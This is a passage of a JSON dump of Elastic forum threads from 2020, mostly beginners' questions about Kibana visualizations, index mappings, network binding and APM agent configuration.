inactive Netstat shows only listening on port 5601, so I imagine that is the problem but I have no idea what is missing to allow me to bind to my ethernet interface. mneely@umbrella-kibana:~$ netstat -anp | grep 5601 (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) tcp 0 0 127.0.0.1:5601 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:57530 127.0.0.1:5601 TIME_WAIT -",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "0028594e-10bd-454b-84bc-d1f17abf0e07",
    "url": "https://discuss.elastic.co/t/kibana-not-connecting-to-elasticservice-in-windows/227334",
    "title": "Kibana not connecting to elasticservice in windows",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 9, 2020, 1:48pm April 9, 2020, 3:07pm April 9, 2020, 5:04pm April 9, 2020, 5:42pm April 9, 2020, 5:51pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "ec89509f-487f-4312-88cf-596198f9711c",
    "url": "https://discuss.elastic.co/t/kibana-does-not-diplay-elasticsearch-index/227343",
    "title": "Kibana does not diplay elasticsearch index",
    "category": [
      "Kibana"
    ],
    "author": "Cristiano_Corrado",
    "date": "April 9, 2020, 2:26pm April 9, 2020, 5:34pm April 9, 2020, 5:00pm April 9, 2020, 5:34pm",
    "body": "Hello, I am sure it has been asked million times but I couldn't find a solution for myself after hours of browsing. I created an index in elasticsearch PUT /coronavirus { \"settings\" : { \"number_of_shards\" : 2 }, \"mappings\": { \"properties\": { \"@timestamp\": { \"type\": \"date\", \"format\": \"date_hour_minute_second\" }, \"Active_Cases\": { \"type\": \"float\" }, \"Country\": { \"type\": \"text\" }, \"Serious_Critical\": { \"type\": \"float\" }, \"Tests_1M_POP\": { \"type\": \"float\" }, \"Tot_Cases_1M_POP\": { \"type\": \"float\" }, \"Tot_Deats_1M_POP\": { \"type\": \"float\" }, \"Total_Cases\": { \"type\": \"float\" }, \"Total_Deaths\": { \"type\": \"float\" }, \"Total_Recovered\": { \"type\": \"float\" } } } } The data mapping is correctly displayed when i import data through a python script using elasticsearch module everythin is fine. If i query GET /coronavirus/_search I get the correct response with data: { \"took\" : 2, \"timed_out\" : false, \"_shards\" : { \"total\" : 2, \"successful\" : 2, \"skipped\" : 0, \"failed\" : 0 }, \"hits\" : { \"total\" : { \"value\" : 218, \"relation\" : \"eq\" }, \"max_score\" : 1.0, \"hits\" : [ { \"_index\" : \"coronavirus\", \"_type\" : \"_doc\", \"_id\" : \"2o1JX3EBirWBsboeoYXp\", \"_score\" : 1.0, \"_source\" : { \"@timestamp\" : \"2020-04-09T15:13:13\", \"Country\" : \"Europe\", \"Total_Cases\" : 757450.0, \"Total_Deaths\" : 62412.0, \"Total_Recovered\" : 174392.0, \"Active_Cases\" : 520646.0, \"Serious_Critical\" : 30515.0, \"Tot_Cases_1M_POP\" : 0.0, \"Tot_Deats_1M_POP\" : 0.0, \"Tests_1M_POP\" : 0.0 } }, I create the index in Kibana and is correctly recognised with right fields and types: image1286×782 54.5 KB When i try to discover data in Kibana i can't see anything I extended the time range for 1 year even if data just recently inserted. image1872×671 48.9 KB Thanks a lot for any suggestions. Best Regards,",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a33c23c0-3051-4897-905e-0f4b14da50d1",
    "url": "https://discuss.elastic.co/t/using-https-to-login-to-kibana/227328",
    "title": "Using https to login to Kibana",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 9, 2020, 1:19pm April 9, 2020, 1:33pm April 9, 2020, 2:04pm April 9, 2020, 2:17pm April 9, 2020, 3:18pm April 9, 2020, 3:36pm April 9, 2020, 4:42pm",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "63f47f65-506b-4cdc-b11d-e889b016b7b1",
    "url": "https://discuss.elastic.co/t/table-in-kibana-with-ratios/225450",
    "title": "Table in Kibana with ratios",
    "category": [
      "Kibana"
    ],
    "author": "stefano_guerrieri",
    "date": "March 27, 2020, 6:11pm April 3, 2020, 7:10pm April 7, 2020, 5:21pm April 7, 2020, 7:00pm April 9, 2020, 4:29pm",
    "body": "Dears, I have this raw data in Elastic: I need first to create in Kibana a table like that one: but the most important is that I have to create a table based on the aggregation above like the following (i'm highlighting the excel formulas to reproduce in Kibana): Is there a way to make in Kibana the tables I need (especially the last one)? Thank you very much",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "8a7a106d-cf75-45cb-a2cc-84320bd0d4dd",
    "url": "https://discuss.elastic.co/t/troubles-displaying-geo-points-on-a-map/227195",
    "title": "Troubles Displaying Geo Points on a Map",
    "category": [
      "Kibana"
    ],
    "author": "",
    "date": "April 8, 2020, 9:45pm April 8, 2020, 9:34pm April 9, 2020, 1:47am April 9, 2020, 1:13pm April 9, 2020, 1:56pm April 9, 2020, 2:24pm April 9, 2020, 4:20pm April 9, 2020, 3:25pm April 9, 2020, 4:20pm",
    "body": "",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "4ffba7b3-7f4c-4bae-85e7-cb2b744ffdd7",
    "url": "https://discuss.elastic.co/t/could-not-generate-pdf-report/227336",
    "title": "Could not generate pdf report",
    "category": [
      "Kibana"
    ],
    "author": "manojkrishna561994",
    "date": "April 9, 2020, 1:49pm April 10, 2020, 9:21am April 9, 2020, 3:51pm",
    "body": "I'm have made a dashboard using the visualizations available, now I want to generate pdf report of that dashboard, however I don't find the pdf option in Dashboard>Share. I'm using the ELK v7.6. How do i enable this \"generate pdf\" option.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "dea2a71b-0069-4421-8e23-d5deb17d7c45",
    "url": "https://discuss.elastic.co/t/ability-to-run-es-queries-directed-at-kibana/225262",
    "title": "Ability to run ES queries directed at Kibana?",
    "category": [
      "Kibana"
    ],
    "author": "slmingol",
    "date": "March 26, 2020, 5:59pm March 26, 2020, 7:14pm April 9, 2020, 3:14pm",
    "body": "We often times use curl to run ES queries at one of the datanodes within our ES cluster. Is there a way to direct these to Kibana and use Kibana as a loadbalancer across all the ES datanodes? Today we have to either use F5 LB and create a endpoint URL to front all the ES datanodes or pick a single ES datanode to target our queries.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "40afe296-3598-496e-832a-4b4da2ebe40d",
    "url": "https://discuss.elastic.co/t/bucket-script-aggregation-per-bucket-in-tsvb-possible/227317",
    "title": "Bucket Script Aggregation per Bucket in TSVB possible?",
    "category": [
      "Kibana"
    ],
    "author": "cyverboy2",
    "date": "April 9, 2020, 12:21pm April 9, 2020, 12:53pm April 9, 2020, 1:31pm April 9, 2020, 2:48pm",
    "body": "Hey there, my data looks like this: Unique ID with should be my buckets Count: Number of entrys per Unique ID, each entry has a separate count value Max: max number of entry per Unique ID Min: min number of entry per Unique ID image898×594 57.7 KB What I want to do now is [((Sum of Max) - (Sum of Min)] / (Sum of Count) = Desired loss rate Is this possible in TSVB? It works for me with one Unique ID, but how can I do this with all Unique IDs? image1020×811 36.1 KB",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d682a021-a541-4051-b04b-13ddf363a1b3",
    "url": "https://discuss.elastic.co/t/control-visualization-list-filtering-on-scripted-metric-field/226286",
    "title": "Control Visualization List Filtering on scripted metric field",
    "category": [
      "Kibana"
    ],
    "author": "silentfilm",
    "date": "April 2, 2020, 8:52pm April 3, 2020, 8:41am April 3, 2020, 1:51pm April 3, 2020, 4:36pm April 3, 2020, 6:35pm April 9, 2020, 9:16am April 9, 2020, 2:07pm",
    "body": "I have several Kibana dashboards that use Option List control filters to allow users to easily filter data. Many of the fields that I filter on for the list are scripted fields in the index. This works great most of the time. However, there is one situation where they don't pull in all possible values. For example, all indexed records contain a hostname, but we use painless scripts to assign them as a ui_hostname, database_hostname, export_hostname, kafka_hostname, etc. depending on the type of data coming in. That way we can easily filter out the messages that don't have anything to do with the ui and just allow the user to select data that came in from ui_hosts. We have found that if hosta and hostb already exist, and data starts coming in from hostc in the middle of the day, that hostc does not appear on the filter pull-down list. After midnight, when a new index file is created, then hostc appears. It is almost as if Kibana only searches the first thousand or so possible values in the index for a field for the option list and then stops looking. Is there a way around this?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "f4507de1-f693-419d-be69-fa94bc5fbf65",
    "url": "https://discuss.elastic.co/t/bar-chart-comparing-time-frames/226950",
    "title": "Bar chart comparing time frames",
    "category": [
      "Kibana"
    ],
    "author": "Graphity",
    "date": "April 7, 2020, 4:17pm April 9, 2020, 1:20pm",
    "body": "Dear fellow users, so, I'm new to Kibana and don't know how to accomplish the following task. I would be very if someone could help me with that. I have a data set of bookings, where each booking has a startTimestamp and an endTimestamp. For both timestamps, I also have a field \"XXXhours\", so a \"startHours\" and an \"endHours\" which allows me to see bookings for each hour of the day. Now, I managed to create a bar chart that shows me the number of bookings every hour easily (Bucket: Histogram, field: startHours, Minimum interval: 1). With the date field next to \"Refresh\" button, I can set e.g. one week I desire to see. I now want to compare one week to another. How can I tell histogram Bucket to choose another time frame, relative to the one chosen in time frame filter? Yours Graphity",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8ffb5ee9-44ba-4bb5-83d2-276e3f3bea03",
    "url": "https://discuss.elastic.co/t/count-on-scripted-field/227308",
    "title": "Count on Scripted Field",
    "category": [
      "Kibana"
    ],
    "author": "nachomartin",
    "date": "April 9, 2020, 11:52am April 9, 2020, 11:59am April 9, 2020, 1:15pm",
    "body": "Hi there, just starting with this. Is there any way to create a scripted field, that allows you to count and add a condition? For example, I would like to check if a Test failed the last 3 times (using doc['outcome')] and if yes, return some string like: \"Failed the last 3 times\". Or, count the COUNT metric ? Example: I have a data table with count metric and errors in bucket, so if the same error has count 2 o 3, display another column \"Failing 2 o 3 times\" Another example could be: I have doc['failingSince.date'] So I would like to check if it failed multiple times on the same date (let's say Today) Is there anyway to achieve something similar ? Thanks a lot!",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c8623f25-cb05-4dc1-853e-89b4b063c207",
    "url": "https://discuss.elastic.co/t/markdown-link-with-current-filter/226245",
    "title": "Markdown link with current filter",
    "category": [
      "Kibana"
    ],
    "author": "liorg2",
    "date": "April 2, 2020, 3:42pm April 2, 2020, 4:10pm April 2, 2020, 6:25pm April 2, 2020, 11:56pm April 3, 2020, 8:05am April 3, 2020, 1:34pm April 3, 2020, 2:28pm April 3, 2020, 4:49pm April 9, 2020, 1:06pm",
    "body": "hello, Is there an option to implement the following: a user finds an interesting case in Dashboard #1, after filtering to a timeframe of 10 minutes , click on a link (markdown?) to drill down the case in dashboard 2, and dashboard 2 opens up, already filtered to the same 10 minutes. thanks!",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "10e150fc-b966-4c64-990c-e36a1a8e885e",
    "url": "https://discuss.elastic.co/t/how-to-create-an-index-2-containing-index-1s-aggregations-results-as-fields/227110",
    "title": "How to create an index_2 containing Index_1's aggregations results as fields?",
    "category": [
      "Kibana"
    ],
    "author": "oula_oula",
    "date": "April 8, 2020, 5:47pm April 8, 2020, 12:53pm April 8, 2020, 5:37pm April 8, 2020, 6:25pm April 9, 2020, 5:32am April 9, 2020, 9:11am April 9, 2020, 9:32am April 9, 2020, 9:51am April 9, 2020, 11:52am",
    "body": "How to create an index_2 containing Index_1's aggregations results as fields ? Is it possible to use a command like this on kibana dev tools ? PUT /index_2/doc_aggs_results_of_index1 { field_aggs1: ... field_aggs2: ... { For example: Index_1 contains: { doc1: name : Superman city: New-York date: 01-05-2015 } { doc2: name : Batman city: Los Angeles date: 22-07-2018 } { doc3: name : Superman city: Sidney date: 12-10-2017 } { doc4: name : Batman city: Paris date: 17-02-2018 } And I'd like to create index that aggregates or queries on index_1 to make index_2 : Index_2 contains: { doc1: name: Superman, cities: [ { city: New-York, date: 01-05-2015 }, { city: Sidney, date: 12-10-2017 }] }, { doc2: name: Batman, cities: [ { city: Los Angeles, date: 22-07-2018 }, { city: Paris, date: 17-02-2018 }] }",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "2b019192-95ed-4d06-b118-80b92e1c4f65",
    "url": "https://discuss.elastic.co/t/host-name-fill-problem/222668",
    "title": "Host.name fill problem",
    "category": [
      "Kibana"
    ],
    "author": "janszo",
    "date": "March 9, 2020, 8:48am March 9, 2020, 11:56pm March 10, 2020, 8:19am March 10, 2020, 12:29pm March 10, 2020, 2:10pm",
    "body": "I need some help. I read a lot about kibana, elasticsearch and logstash, but I'm get stucked. We've 2 vm's with ubuntu 18.04. on of them is the kibana with elasticsearch (1st) the other is a rsyslog collector (2nd). The windows servers send the log via winlogbeat to the 1st it is working properly. The linux servers connected to the 2nd and the log sendings working fine as well. We collect the warning logs to separated log files like servername_syslog.log. I tried to transfer this log files via filebat from 2nd to 1st. It is working but when I try to browes the logs the host name is 2nd, how can I change taht field? Can I? I read another option it is the logstash, where I have to make a logstah server and the rsyslog push it to the logstash and the logstash send it to the elasticsearch and maybe the fields will be good for me. My question is which is the easiest way? thx janszo",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "543b8ee4-7096-4578-bb6a-b8821858fa4c",
    "url": "https://discuss.elastic.co/t/visualization-without-relationship/226725",
    "title": "Visualization without relationship",
    "category": [
      "Kibana"
    ],
    "author": "liorg2",
    "date": "April 6, 2020, 2:03pm April 8, 2020, 11:27pm April 9, 2020, 7:33am",
    "body": "Hi, can I search somehow (interface/api) visualizations, that are NOT related to any dashboard? thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a97d8ed0-0b4c-4906-b6c0-f6d8927391ca",
    "url": "https://discuss.elastic.co/t/advanced-json-input-option-in-datatable-is-not-supporting-aggregation/227088",
    "title": "Advanced JSON input option in Datatable is not supporting aggregation",
    "category": [
      "Kibana"
    ],
    "author": "RamyaGowda",
    "date": "April 8, 2020, 9:27am April 9, 2020, 7:25am",
    "body": "Hello Team, I am trying to take a percentage value using two fields in data table visualization , though Data tables doesn't support bucket script or Math ,i am trying to write my aggregation query inside Advanced option Below is the query which i am trying to put in Advanced option { \"aggs\": { \"dentination_wise\": { \"terms\": { \"field\": \"CALLED_NUMBER_COUNTRY_ABBR.keyword\", \"size\": 20 }, \"aggs\": { \"sumofin\": { \"sum\": { \"field\": \"INCOMING_TRUNK_PRESENT\" } }, \"sumofcs\": { \"sum\": { \"field\": \"CALL_ANSWER_STATUS\" } }, \"percentage\": { \"bucket_script\": { \"buckets_path\": { \"my_var1\": \"sumofcs\", \"my_var2\": \"sumofin\" }, \"script\": \"params.my_var1 / params.my_var2*100\" } } } } } } But I am getting an Internal Server Error, Is it something not supported by Elasticsearch, What are the other option to take out percentage value then? except Visual Builder. Seeking your help Thanks Ramya",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "fd5d320d-25b0-455b-bf62-3d11413b90d3",
    "url": "https://discuss.elastic.co/t/find-a-visualize-by-its-name/227179",
    "title": "Find a visualize by its name",
    "category": [
      "Kibana"
    ],
    "author": "RickT",
    "date": "April 8, 2020, 4:47pm April 8, 2020, 11:03pm April 9, 2020, 6:29am",
    "body": "Hi, i don't understand how the search field working in Visualize screen. My Visu is named \"abc good job\" i've trying some syntaxes : \"abc good job\" ==> good result \"abc\" ==> KO ! \"abc good *\" ==> KO ! \"abc good ?ob\" ==> KO ! is there a doc which explain it. ELK 6.8.1 image718×188 5.62 KB Thanks.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "33bd8016-374b-4849-bdd1-69d36b740a7f",
    "url": "https://discuss.elastic.co/t/create-transactions-from-logs-in-net/226862",
    "title": "Create Transactions from logs in .net",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 7, 2020, 9:58am April 21, 2020, 12:42pm April 7, 2020, 12:26pm April 7, 2020, 1:36pm April 8, 2020, 5:26am April 21, 2020, 12:42pm April 11, 2020, 11:47am April 11, 2020, 12:02pm April 21, 2020, 2:19pm April 22, 2020, 5:21pm",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "f9d8b139-15c6-4fbb-952b-8ab39e8b9665",
    "url": "https://discuss.elastic.co/t/how-to-adjust-apm-client-setlabel-index-field-type-to-geo-point/226994",
    "title": "How to adjust apm client .setLabel() index field type to \"geo_point\"",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 8, 2020, 6:21am April 9, 2020, 12:29pm April 9, 2020, 12:32pm April 14, 2020, 3:14am April 14, 2020, 3:31am April 21, 2020, 7:22pm April 21, 2020, 8:00pm April 21, 2020, 8:02pm April 21, 2020, 8:08pm April 21, 2020, 8:20pm",
    "body": "",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "af8edf39-ce18-4db9-9e09-78f342e9153f",
    "url": "https://discuss.elastic.co/t/sending-traces-from-the-jaeger-hotrod-app-to-elastic-apm-on-openshift/228227",
    "title": "Sending traces from the Jaeger hotrod app to Elastic APM on Openshift",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 16, 2020, 4:45am April 16, 2020, 2:37am April 16, 2020, 5:53pm April 16, 2020, 5:53pm April 21, 2020, 9:55am",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "3406f041-a1c1-4455-a958-56a5f3f1c3a5",
    "url": "https://discuss.elastic.co/t/java-apm-agent-not-pushing-cpu-memory-metric-ibm-java-on-websphere-liberty/228064",
    "title": "Java APM agent not pushing CPU & Memory metric - IBM Java on WebSphere Liberty",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 15, 2020, 9:02am April 15, 2020, 9:39am April 16, 2020, 2:43pm April 17, 2020, 1:42pm April 20, 2020, 3:46pm April 20, 2020, 3:46pm April 20, 2020, 3:46pm",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "1d884ce0-9c95-41ef-980b-4f742f26b12e",
    "url": "https://discuss.elastic.co/t/distributed-tracing-on-net-fullframework/228663",
    "title": "Distributed Tracing on .Net FullFramework",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 18, 2020, 5:18pm April 20, 2020, 1:42pm April 20, 2020, 1:30pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "040b5fda-8467-4950-b0b4-ce4d39014d6e",
    "url": "https://discuss.elastic.co/t/is-there-any-way-to-deploy-the-apm-app-server-for-vary-kibana-spaces/228823",
    "title": "Is there any way to deploy the apm app/server for vary kibana spaces?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 20, 2020, 12:30pm April 20, 2020, 12:58pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "9b5192b8-3e79-4d90-b0e0-fa2a4afbadd7",
    "url": "https://discuss.elastic.co/t/elastic-apm-net-agent-is-not-instrumenting-methods/228815",
    "title": "Elastic APM .net agent is not instrumenting methods",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 20, 2020, 8:50am April 20, 2020, 8:59am April 20, 2020, 9:02am April 20, 2020, 9:22am April 20, 2020, 12:02pm April 20, 2020, 12:19pm April 20, 2020, 12:55pm",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "080675e7-b9a4-441d-ac40-2b71276bb4c5",
    "url": "https://discuss.elastic.co/t/elastic-how-to-enable-autodetect-on-metadata-like-container-id-in-elastic-apm-agent-apm-server/227257",
    "title": "Elastic: How to enable autodetect on metadata like container id in Elastic APM Agent/APM Server?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 9, 2020, 7:14am April 20, 2020, 10:59am April 20, 2020, 8:10am April 20, 2020, 9:00am April 20, 2020, 12:47pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "8eaf0617-5db9-4a7f-92bc-99b726fb3ecb",
    "url": "https://discuss.elastic.co/t/es-index-name-based-on-global-labels/228692",
    "title": "ES Index Name based on global_labels",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 20, 2020, 9:06am",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "5ff57aeb-7f3f-4374-b243-c68e4ad810d7",
    "url": "https://discuss.elastic.co/t/use-apm-in-a-windows-service-non-net-core/225985",
    "title": "Use APM in a Windows Service (non .net core)",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 1, 2020, 8:19am April 1, 2020, 9:24am April 1, 2020, 10:29am April 1, 2020, 10:44am April 15, 2020, 6:18am April 15, 2020, 10:32am April 17, 2020, 6:51am April 17, 2020, 3:22pm",
    "body": "",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "2f275b40-b66a-4727-ae50-86f9b8c40e96",
    "url": "https://discuss.elastic.co/t/apm-agent-not-able-to-send-in-logs-to-apm-server-error-connection-refused/228503",
    "title": "APM Agent not able to send in logs to APM Server error: Connection refused",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 17, 2020, 11:47am April 17, 2020, 11:55am April 17, 2020, 12:18pm April 17, 2020, 12:34pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "90c76c42-a573-4099-8ff2-5603651c725f",
    "url": "https://discuss.elastic.co/t/restrict-kibana-users-to-only-see-some-apm-service-environment-in-apm-ui/227784",
    "title": "Restrict Kibana users to only see some APM service.environment in APM UI",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 13, 2020, 2:52pm April 16, 2020, 4:06pm April 16, 2020, 4:06pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a130b57e-8ce5-429d-a628-cf67e905e7e1",
    "url": "https://discuss.elastic.co/t/how-to-monitor-a-live-site-with-apm-server/227622",
    "title": "How to monitor a live site with APM Server?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 14, 2020, 6:21am April 14, 2020, 11:54am April 16, 2020, 1:59pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "a5a04da4-f478-4392-8e94-0b4382e1f55a",
    "url": "https://discuss.elastic.co/t/why-does-apm-server-not-display-frontend-information-on-kibana-if-apm-javascript-agent-accesses-requests-from-ingress/225605",
    "title": "Why does apm-server not display frontend information on kibana if apm javascript agent accesses requests from ingress",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "March 30, 2020, 9:29am April 16, 2020, 6:09am March 30, 2020, 10:28am April 16, 2020, 6:09am April 1, 2020, 3:37am April 1, 2020, 6:31am April 2, 2020, 7:41am April 2, 2020, 11:12am April 4, 2020, 6:52am April 6, 2020, 6:56am April 6, 2020, 7:07am April 6, 2020, 7:27am April 6, 2020, 7:32am April 6, 2020, 7:39am April 6, 2020, 9:07am April 7, 2020, 12:39am April 7, 2020, 7:28am April 9, 2020, 3:44am April 14, 2020, 6:17am April 15, 2020, 1:54am",
    "body": "",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "0e5cb5bb-c8aa-41fb-a7e4-d38a0bdefb41",
    "url": "https://discuss.elastic.co/t/cannot-run-apm-server-with-fresh-installation-on-windows-10/228081",
    "title": "Cannot run APM Server with fresh installation on Windows 10",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 15, 2020, 10:25am",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "5a657075-d507-418b-aa97-88776bfd702d",
    "url": "https://discuss.elastic.co/t/java-agent-grpc-not-working/226795",
    "title": "Java Agent grpc not working",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 6, 2020, 11:36pm April 15, 2020, 9:01am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4cfd2caa-00ee-4147-8c77-8b1d87754021",
    "url": "https://discuss.elastic.co/t/will-apm-java-agent-work-for-java-serverless-application/226617",
    "title": "Will APM java agent work for java serverless application?",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 6, 2020, 5:42am April 15, 2020, 8:58am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a5e48c7e-da76-47e1-8dc4-8560c201e2f4",
    "url": "https://discuss.elastic.co/t/java-thread-list/226566",
    "title": "Java thread list",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 7, 2020, 8:21am April 15, 2020, 8:54am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ca0699d9-53c5-4563-a26f-a0124f952a6e",
    "url": "https://discuss.elastic.co/t/intrument-some-classes-or-methods-instead-of-profiling-sampling/227735",
    "title": "Intrument some classes or methods instead of profiling sampling",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 13, 2020, 6:28am April 14, 2020, 6:50am April 14, 2020, 8:37am April 14, 2020, 8:57am April 15, 2020, 1:44am April 15, 2020, 5:41am",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "c73b21e1-a341-41f9-8b4e-056c94480bbe",
    "url": "https://discuss.elastic.co/t/create-elastic-maps-for-index-pattern-apm/225463",
    "title": "Create Elastic Maps for index pattern apm-*",
    "category": [
      "APM"
    ],
    "author": "anjana1",
    "date": "March 27, 2020, 8:02pm April 9, 2020, 6:57pm April 14, 2020, 6:28am April 14, 2020, 5:28pm April 15, 2020, 5:11am",
    "body": "Kibana version : 7.6 Elasticsearch version : 7.6 APM Server version : 7.3.2 APM Agent language and version : java 1.9.0 Fresh install or upgraded from other version? fresh install Is there anything special in your setup? For example, are you using the Logstash or Kafka outputs? Are you using a load balancer in front of the APM Servers? Have you changed index pattern, generated custom templates, changed agent configuration etc. :-----No Description of the problem including expected versus actual behavior. Please include screenshots (if relevant) : I am trying to map my store locations in a Map . I have stored my storelocation , latitude as a label on the apm span. How can I map these latitudes to create or map it in Elastic Maps. I see client.geo.location .Is there a way I can map my apm spans properties to client.geo.location .",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "272d25ac-dbf2-4bc6-a444-5eb7c12c472e",
    "url": "https://discuss.elastic.co/t/how-to-link-to-error-group-ids/227471",
    "title": "How to link to Error Group IDs",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 10, 2020, 3:47pm April 14, 2020, 4:18pm April 14, 2020, 4:18pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b91828e4-751d-45fe-89b6-d07dacd90786",
    "url": "https://discuss.elastic.co/t/customize-number-separator-in-apm/226573",
    "title": "Customize number separator in APM",
    "category": [
      "APM"
    ],
    "author": "",
    "date": "April 6, 2020, 7:47am April 14, 2020, 11:38am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "032d5d77-ddb7-4282-a17b-2bc9cce018ed",
    "url": "https://discuss.elastic.co/t/setting-a-static-secret-token/227196",
    "title": "Setting a \"static\" secret token",
    "category": [
      "APM"
    ],
    "author": "tsbayne",
    "date": "April 8, 2020, 7:03pm April 9, 2020, 12:02pm April 9, 2020, 12:13pm April 13, 2020, 3:22pm",
    "body": "This might be a really stupid question, but I've wasted a lot of time trying to figure this out on my own. I struggle to translate the documentation. I don't speak elastic. I barely speak kubernetes. So I'll apologize in advance if I'm asking a dumb question. Long story short: I need a way to set a static secret token created by the elastic operator when deploying apm. Every time APM is redeployed, the token changes. because the token is hard coded in our node projects, we obviously can't change this every time. Is there a way to set a static token in the kubernetes deployment so it's always the same or is there some other method I can use to make sure projects always use the right token? Kibana version: 7.6.2 Elasticsearch version: 7.6.2 APM Server version: 7.6.2 Original install method (e.g. download page, yum, deb, from source, etc.) and version: Elastic Cloud on Kubernetes (ECK) Fresh install or upgraded from other version? Fresh Is there anything special in your setup? For example, are you using the Logstash or Kafka outputs? Are you using a load balancer in front of the APM Servers? Have you changed index pattern, generated custom templates, changed agent configuration etc. no",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "f1c75732-e1b2-4dbf-beb3-9c49db63a6c6",
    "url": "https://discuss.elastic.co/t/customer-plugin/227741",
    "title": "Customer plugin",
    "category": [
      "APM"
    ],
    "author": "hyhong",
    "date": "April 13, 2020, 7:40am April 13, 2020, 9:30am",
    "body": "I have write a customer plugin,but it's not show in the kibana.I have debug,it's doesn't have applying,like this: Applying instrumentation co.elastic.apm.agent.httpclient.ApacheHttpAsyncHttpClientInstrumentation.I cann't see my instrumentation",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "fbb39ccc-26d3-4007-bfbc-c975a8d45a7b",
    "url": "https://discuss.elastic.co/t/get-average-number-of-spans-queries-in-a-transaction-grouped-by-path/226349",
    "title": "Get average number of spans (queries) in a transaction grouped by path",
    "category": [
      "APM"
    ],
    "author": "Joren_Inghelbrecht",
    "date": "April 3, 2020, 7:15am April 3, 2020, 2:22pm April 3, 2020, 11:50am April 3, 2020, 12:23pm April 3, 2020, 2:22pm April 3, 2020, 4:46pm April 4, 2020, 9:04am April 4, 2020, 10:55am April 5, 2020, 9:17am April 9, 2020, 12:27pm April 10, 2020, 4:36pm April 10, 2020, 8:35pm April 12, 2020, 4:10pm April 13, 2020, 8:52am",
    "body": "Elastic deployment version: v7.6.1 I'm trying to create a visualization which gives me the average number of queries per request. So basically what I want to see is: GET /users/ => 5 queries POST /users/ => 3 queries GET /users/:id/books => 555 queries (N+1 query problem) Our Java backend application is using the Java apm agent and everything works as expected. An example transaction: image1514×818 77.9 KB Option 1: I found in the docs that there is a transaction.span_count.started property which gives me what I need (no all spans are queries, but that's not really an issue). I can also see the property when I check out the doc of the request: However, this seems to be an unmapped field, so I cannot use it in a visualization. I searched for \"No cached mapping for this field\" in this forum/Goolge/Github, but none of the solutions worked. This is what I tried: Refresh index in Kibana management Remove index (it is automatically added again when going to the apm tab) The field is mentioned in the docs: https://www.elastic.co/guide/en/apm/server/7.6/transaction-indices.html But it's missing here: https://www.elastic.co/guide/en/apm/server/7.6/exported-fields-apm-transaction.html https://github.com/elastic/apm-server/blob/07f35ab548b5338086db2a061a727826359c7166/model/transaction/_meta/fields.yml Since the apm index is automatically created, I'm not 